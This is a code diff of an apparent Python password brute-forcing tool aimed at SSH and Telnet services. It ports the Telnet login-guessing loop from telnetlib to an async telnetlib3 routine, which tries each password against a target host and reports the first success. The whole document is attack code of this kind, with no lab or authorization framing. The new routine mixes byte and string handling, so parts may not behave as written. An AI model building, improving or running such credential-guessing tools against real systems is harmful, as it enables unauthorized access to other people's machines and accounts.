@@ -1,5 +1,6 @@
 import paramiko
-import telnetlib
+import asyncio
+import telnetlib3
 import time
 
 def brute_force_ssh(target, username, password_list, port=22):
@@ -35,31 +36,49 @@ def brute_force_ssh(target, username, password_list, port=22):
         
     return results
 
+async def attempt_telnet_login(target, port, username, password):
+    try:
+        reader, writer = await asyncio.wait_for(telnetlib3.open_connection(target, port), timeout=5)
+        
+        # Read until login prompt
+        await asyncio.wait_for(reader.readuntil(b"login: "), timeout=3)
+        writer.write(username + "\n")
+        
+        # Read until password prompt
+        await asyncio.wait_for(reader.readuntil(b"Password: "), timeout=3)
+        writer.write(password + "\n")
+        
+        # Read response to check for success
+        # Note: telnetlib3 might return different encoding, usually strings.
+        response = await asyncio.wait_for(reader.read(1024), timeout=3)
+        
+        writer.close()
+        
+        if "Login incorrect" not in response and "failed" not in response:
+            return True, None
+        return False, None
+        
+    except Exception as e:
+        return False, str(e)
+
 def brute_force_telnet(target, username, password_list, port=23):
     results = []
+    
+    # Run the async loop for each password (simple approach) or batch them
+    # For now, keeping it sequential to match previous logic's style
     
     for password in password_list:
         password = password.strip()
         try:
-            tn = telnetlib.Telnet(target, port, timeout=3)
-            tn.read_until(b"login: ", timeout=2)
-            tn.write(username.encode('ascii') + b"\n")
-            
-            tn.read_until(b"Password: ", timeout=2)
-            tn.write(password.encode('ascii') + b"\n")
-            
-            response = tn.read_some().decode('ascii')
-            
-            if "Login incorrect" not in response and "failed" not in response:
+             # Run single attempt synchronously
+             success, error = asyncio.run(attempt_telnet_login(target, port, username, password))
+             
+             if success:
                  success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
                  results.append({"status": "success", "password": password, "message": success_msg})
-                 tn.close()
                  return results
-            
-            tn.close()
-            
+                 
         except Exception as e:
-            # results.append({"status": "error", "message": str(e)})
             pass
             
     if not results:
